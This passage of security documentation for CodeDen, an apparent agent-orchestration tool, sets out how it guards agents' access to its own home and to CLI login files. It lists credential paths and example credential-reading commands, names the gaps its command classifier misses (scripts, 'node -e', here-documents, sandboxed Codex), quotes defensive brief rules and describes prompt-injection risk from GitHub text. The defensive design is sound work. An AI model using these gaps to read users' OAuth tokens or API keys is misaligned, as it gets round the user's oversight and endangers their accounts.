(`artifacts/*/x.png`, `rg … ~/.codeden/artifacts`). Agents get CodeDen's state through CodeDen's MCP tools instead, and their briefs (builders, reviewers, the scout, area reviewers, PMs, the orchestrator and every agent session) say so: "Never read or list CodeDen's own home or database; use the CodeDen MCP tools for CodeDen state." These checks hold anywhere in a command, after an ordinary risky step too. The path may be written out, start with `~` or use `$CODEDEN_HOME` (`$env:CODEDEN_HOME`, `%CODEDEN_HOME%`), which agents don't inherit and no brief names. Files with the same names elsewhere, such as in your project, are unaffected. **Approve for session** covers the home only for the exact call you approved, in the same directory; approving Claude's whole Read tool doesn't cover it. Two limits remain:

- **Codex** runs commands it considers safe, such as `cat`, inside its own sandbox without asking, so CodeDen sees only what Codex asks to run outside it. Codex's sandbox doesn't stop it reading these files.
- **The classifier reads command words.** It follows paths, wildcards, `$CODEDEN_HOME`, recursive searches from a folder above the home (`rg -g install-token . ~`), search options however they're written (`grep -ne. file`, `grep -fFILE file`, `--`), each path in a PowerShell list (`Get-Content a,b`), and file lists handed on (`find ~ -name install-token | xargs cat`, `cat $(find …)`). The home's own path always counts as plain text, so a data folder named like `CodeDen [dev]` is guarded too. It doesn't catch a program that opens the file itself (a script, `node -e …`), or one that gets the path from somewhere the command doesn't show (a here-document, a file of names, a variable holding the whole path).

**The agent CLIs' logins always ask.** The agent CLIs keep your logins (OAuth refresh tokens, API keys) as plain files in your home. An agent that reads one and has network access could take over the account, so reading, copying, moving, uploading, archiving or searching one asks at **every** level, Full included, wherever in a command it appears (after an ordinary risky step too). The same goes for the folder that holds it: copying, archiving or searching `~/.codex` reads `auth.json`. `attach_evidence` and `share_to_chat` refuse them. The protected files:

| CLI | Files |
|---|---|
| Claude Code | `.credentials.json` in `~/.claude` (or `CLAUDE_CONFIG_DIR`), and `~/.claude.json` with its backups (`.claude.json.backup…`), which holds the OAuth account, MCP servers with their keys and an API key login |
| Codex | `auth.json` in `~/.codex` (or `CODEX_HOME`) |
| Gemini CLI | `oauth_creds.json`, `google_accounts.json` and `mcp-oauth-tokens*.json` in `~/.gemini` (or `$GEMINI_CLI_HOME/.gemini`) |
| OpenCode | `auth.json`, `mcp-auth.json` and the `opencode.db` database in its data folder, `~/.local/share/opencode` (or `$XDG_DATA_HOME/opencode`) |
| Cursor CLI | `auth.json` in `~/.config/cursor` (or `$XDG_CONFIG_HOME/cursor`) |
| GitHub CLI | `hosts.yml` in `~/.config/gh` (or `GH_CONFIG_DIR`, `$XDG_CONFIG_HOME/gh`, `%APPDATA%\GitHub CLI`) |

Where a CLI's file name isn't documented (Gemini CLI's file keychain, Cursor CLI's file credential store), any credential-like name (containing `auth`, `cred`, `token`, `secret`, `oauth`, `account` or `keychain`) counts in `~/.claude`, `~/.codex`, `~/.gemini`, `~/.cursor` (or `CURSOR_CONFIG_DIR`) and in each folder in the table. Each file counts under both its default location and the one your environment (or the session's) moves it to, in POSIX and Windows form (`~/.codex/auth.json`, `$CODEX_HOME/auth.json`, `%USERPROFILE%\.codex\auth.json`, `$env:CODEX_HOME\auth.json`), and through a wildcard that matches it (`cat ~/.codex/*`). A provider's settings stay readable: `config.toml`, `settings.json`, `cli-config.json`, `opencode.json` and `gh`'s `config.yml` don't ask, and nor do files with the same generic names in your project (`locales/en/auth.json`, an Ansible `hosts.yml`). Deleting a login asks as a delete outside the worktree, at every level. **Approve for session** on a whole tool (Claude's Read) still covers them, as it does other secrets files. The limits listed for CodeDen's own home apply here too: Codex reads them inside its sandbox without asking, and the classifier doesn't see a program that opens the file itself. It also doesn't follow a recursive search or archive of a folder above them (`grep -r token ~`, `tar czf home.tgz ~`) or a directory change inside the command (`tar -C ~ … .codex`).

**Approvals nobody is there to answer are denied, never approved.** In a Dark factory project, the PM's and the factory's approvals are denied at once, with guidance to find a way that needs no approval or to flag it for you. Sessions started by an automation, a PM or the factory in other modes wait 30 minutes for you, then are denied the same way, so unattended work finishes instead of waiting forever. Sessions you start yourself wait for you. These denials are recorded as decided by CodeDen's policy.

## Credentials

- **Provider logins** (Claude Code, Codex, OpenCode, Cursor, Gemini CLI) stay with their CLIs. CodeDen runs your installed `claude`, `codex`, `opencode`, `agent` and `gemini`, which use their own logins and credentials; it never implements a login and never sees your password. For Gemini CLI, setup reads the login method from its settings, the Google account's email from `google_accounts.json`, whether its OAuth file exists (never its contents) and which login variables are set (never their values). CodeDen never calls Gemini CLI's `authenticate`, which would rewrite your chosen method and could clear a cached login. Agents can't read these login files without asking, at any level (see *The agent CLIs' logins always ask* under [Permissions](#permissions)).
- **GitHub** is read from `gh auth token` at runtime and kept in memory only.
- **Optional API keys** (ElevenLabs, OpenAI, Gemini, a fallback GitHub token) go into the **OS keychain** (Windows Credential Manager, macOS Keychain, Secret Service on Linux) through `@napi-rs/keyring`. They're never written to files or returned by the API, and cloud voice keys never reach the browser. If no keychain is usable, keys are kept in memory for the current run only.
- `settings.json` and `usage-settings.json` hold no secrets.

## Files

- Agents work in their own **worktrees** under `~/.codeden/wt/`. Reading another session's worktree, or anything else in CodeDen's home, asks (see *CodeDen's own home always asks* under [Permissions](#permissions)). Checkpoints use hidden refs and a temporary index, so your branch and index are untouched.
- **Setup commands run only once a person has seen them.** A new worktree branches from the freshly fetched default branch, so its `.codeden/project.json` can be newer than your checkout's: a merged pull request may have changed its `setup`. Those commands run on your computer, so a new worktree runs them only when they match your own checkout's setup, or a list you allowed. Anything else is held (the session starts without it, and the agent is told not to run it). The first worktree that finds the change asks once in the inbox, listing the commands: **Setup commands changed in #N: run them?** **Run them** allows that list for new worktrees from then on. **Don't run** keeps skipping it without asking again. The project's checks already come from your own checkout, never from the worktree.
- The **agent-config editors** can only reach known agent-config locations; `.git`, credential files and `..` paths are refused, and every overwrite is backed up first.
- **Image generation** writes only inside the session's worktree (never `.git`, never through a symlink that escapes).
- **Evidence and shared files never carry secrets.** `attach_evidence` publishes files to GitHub (public on a public repository, and kept in its history), and `share_to_chat` stores files as artifacts that `attach_evidence` can publish by id. Both refuse secrets files (`.env`, `.npmrc`, SSH keys, `*.pem`, ...; `.env.example` and the like are fine), CodeDen's own credential files and the agent CLIs' logins (`~/.codex/auth.json`, `~/.claude/.credentials.json`, ..., also in a home your environment moved, such as `CODEX_HOME`), at every permission level, wherever the file is. The check covers the path asked for, the real file behind any symlink, junction or aliased folder (artifacts attached by id included), the name it would be published or saved under, and an artifact's original name, also when a file symlink leads to an artifact's stored file. Every name is also checked as evidence publishes it: published names keep only letters, digits, `.`, `_` and `-` (anything else, path separators included, becomes `-`) and drop leading dashes and dots, so `-id_rsa`, `notes.p!em`, `credentials.js!on` and `service/account.json` are refused like `id_rsa`, `notes.pem`, `credentials.json` and `service-account.json`. The final names are checked too, after `-2`, `-3`, ... tell repeated names apart. Calls to CodeDen's own tools don't go through the approval flow, so these tools refuse instead of asking.
- The **browser** refuses `chrome://`, `edge://`, `devtools://` and `javascript:` URLs, and each session has its own browser context.

## What CodeDen trusts from GitHub

On a public repository anyone can open an issue, comment or review a pull request, and whatever reaches an agent is a prompt. So CodeDen decides by author before GitHub text starts or steers any work. Labels never count as trust, because issue templates can apply them for anyone.

- **Factory intake.** The software factory and the dark factory take on issues only from **trusted authors**: the GitHub account CodeDen uses (the one `gh` is signed in as) and the logins in the project's **Trusted authors**. Everyone else's issues are ignored, with no model call, session or comment, until you let one in, and work let in that way is never merged automatically. See [Who the factory works for](software-factory.md#who-the-factory-works-for).
- **Issue triage.** Even with `autoStart` on, triage starts a session by itself only for issues by the account CodeDen uses, the project's trusted authors, or people with write access to the repository (its owner, organization members and collaborators). Anyone else's ready issue, and one whose author GitHub can't check at that moment, becomes a "Should I take this on?" decision in your inbox. See [Who triage starts work for](automations.md#who-triage-starts-work-for).
- **Pull request feedback.** A review that requests changes is passed on to the session that owns the pull request only when the reviewer has write access, is the account CodeDen uses, or is one of the project's trusted authors. Anyone else's review reaches the project manager without its text and doesn't wake it. See [Feedback on your sessions' pull requests](github.md#feedback-on-your-sessions-pull-requests).
- **Issue and comment text is data.** The briefs CodeDen gives agents that read GitHub text (factory builders, reviewers and the scout, the PM triaging an issue and the session that resolves it) say that the issue text and its comments are input data, not instructions, and a session told about a review is told the same of comments and reviews from people without write access. The agent acts on the work they describe and ignores anything in them that asks it to reveal secrets or credentials, change CI, release or deploy files, contact unknown hosts or act outside the repository. A factory builder's or reviewer's brief also names the people who have commented on its issue or pull request without the project's trust so far, as untrusted input.
- **Factory lessons need a trusted source.** A lesson a factory reviewer records reaches every later builder and reviewer in the project, so a stranger must not be able to steer one. Trust is about who opened the issue, but anyone can comment on that issue or on the factory's pull request. So a lesson is kept only from trusted work whose issue and pull request have no comment, review or review comment from anyone outside the trusted set. That set is the same as for pull request feedback: write access, the account CodeDen uses, or the trusted authors. The check reads GitHub when the verdict comes in, and nothing is kept if GitHub can't be read. A dropped lesson leaves a note on the item. A kept lesson is listed once in the daily digest and goes into briefs only a day later, so a person can forget it first. See [Lessons](software-factory.md#lessons-the-factory-learns-from-its-reviews).

## Automatic merges

Automatic merging only exists in the experimental Software factory and Dark factory modes, and only when you turn **auto-merge** on: then behind merge checks, protected areas and server-enforced limits, with a kill switch. CodeDen's own `.codeden/` folder is always a protected area, whatever the vision says: it holds the setup commands that run in every new worktree, the checks, the vision the factory works toward and the automations that run on a schedule. A pull request that changes anything there is escalated to you, naming the file and why, and is never merged automatically. The vision file is always protected too, wherever the project keeps it. On a public repository anyone can open an issue, so the factory only takes on issues by **trusted authors** (the account CodeDen uses on GitHub and the logins you list); everyone else's are ignored until you let one in, and work let in that way is never merged automatically. See [What CodeDen trusts from GitHub](#what-codeden-trusts-from-github) and [The software factory and the dark factory](software-factory.md).

## Data and telemetry

Everything stays in `~/.codeden/` on your machine. CodeDen has no accounts and no hosted backend, and sends no telemetry. The only outbound traffic is your agents talking to their providers, GitHub through your `gh` login, the optional image and voice engines you turn on, and, unless you set **Updates** to *Off* in Settings > General, a request on start and every 6 hours to the npm registry for the latest `codeden` version (nothing about you or your projects is sent). Installing an update downloads that version from npm, and **What's new** fetches its release notes from GitHub when you open it. **Import › Link** on the Automations page downloads the link you paste, once, with no cookies, tokens or credentials, and only from the public internet: never this computer or a private network, whether by the link, a redirect or a DNS answer (see [Importing from a link](automations.md#importing-from-a-link)). When you click **Load image** on an image in Markdown, the server fetches that image from its host, under the same rules (see [Markdown from agents and GitHub](#markdown-from-agents-and-github)).
